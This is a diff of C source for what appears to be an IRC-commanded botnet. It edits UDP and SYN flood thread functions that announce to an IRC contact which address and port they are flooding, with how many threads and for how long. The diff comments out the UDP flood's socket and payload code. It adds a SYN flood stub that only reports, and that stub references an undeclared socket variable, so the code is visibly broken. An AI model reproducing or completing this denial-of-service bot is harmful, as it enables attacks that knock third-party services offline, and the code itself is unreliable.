@@ -61,10 +61,13 @@
 // NOT SURE IF WORKING, REQUIRES TESTING
 // NOT SURE IF WORKING, REQUIRES TESTING
 void *udp_flood (void *args) {
-    int err;
-    char output[MAX_MSG_SIZE];
-    char payload[65000];
+    printf ("Executing UDP\n");
     thr_args *ta = (thr_args *)args;
+    char output[MAX_MSG_SIZE];
+
+    /*
+    int err;
+    char payload[65000];
 
     // set up connection data
     SOCKET target_s;
@@ -92,12 +95,12 @@ void *udp_flood (void *args) {
     if (target_s == -1) {
         return NULL;
     }
-    
+    */
     snprintf (output, sizeof (output), "PRIVMSG %s :UDP Flooding %s:%s with %d threads for %ds.\r\n", 
                 ta->contact, ta->addr, ta->port, 
                 ta->threads, ta->time);
     send (ta->s, output, strlen (output), 0);
-
+    /*
     // payload data
     memset (payload, 0x41, sizeof (payload)-1);
     payload[strlen (payload)] = '\0';
@@ -115,6 +118,8 @@ void *udp_flood (void *args) {
     freeaddrinfo (res);
 
     shutdown (target_s, SD_BOTH);
+    */
+    puts ("exiting thread");
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
     closesocket (target_s);
@@ -122,10 +127,11 @@ void *udp_flood (void *args) {
 
 #elif defined(__linux__)
 
-    close (target_s);
+    //close (target_s);
     pthread_exit (0);
 
 #endif
+
     return NULL;
 }
  
@@ -136,6 +142,28 @@ void *udp_flood (void *args) {
  */
 void *syn_flood (void *args) {
     // todo
+    printf ("Executing SYN\n");
+    thr_args *ta = (thr_args *)args;
+    char output[MAX_MSG_SIZE];
+
+    snprintf (output, sizeof (output), "PRIVMSG %s :SYN Flooding %s:%s with %d threads for %ds.\r\n", 
+                ta->contact, ta->addr, ta->port, 
+                ta->threads, ta->time);
+    send (ta->s, output, strlen (output), 0);
+
+
+    puts ("exiting thread");
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+    closesocket (target_s);
+    ExitThread (0);
+
+#elif defined(__linux__)
+
+    //close (target_s);
+    pthread_exit (0);
+
+#endif
 
     return NULL;
 }
